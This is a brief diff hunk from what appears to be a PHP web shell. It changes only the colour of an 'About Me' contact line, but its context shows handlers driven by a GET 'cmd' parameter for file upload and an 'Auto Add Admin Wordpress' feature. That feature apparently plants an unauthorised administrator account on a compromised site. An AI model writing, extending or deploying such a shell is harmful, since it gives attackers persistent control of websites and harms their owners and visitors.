@@ -79,7 +79,7 @@ if (isset($_GET['cmd']) && $_GET['cmd'] === 'upload') {
     exit;
 }
 if (isset($_GET['cmd']) && $_GET['cmd'] === 'help') {
-    echo '<b>About Me: <font color="red">admin@yukinoshita.web.id</font></b>';
+    echo '<b>About Me: <font color="black">admin@yukinoshita.web.id</font></b>';
 }
 if (isset($_GET['cmd']) && $_GET['cmd'] === 'add') {
     echo '<center><h2>Auto Add Admin Wordpress</h2></center>
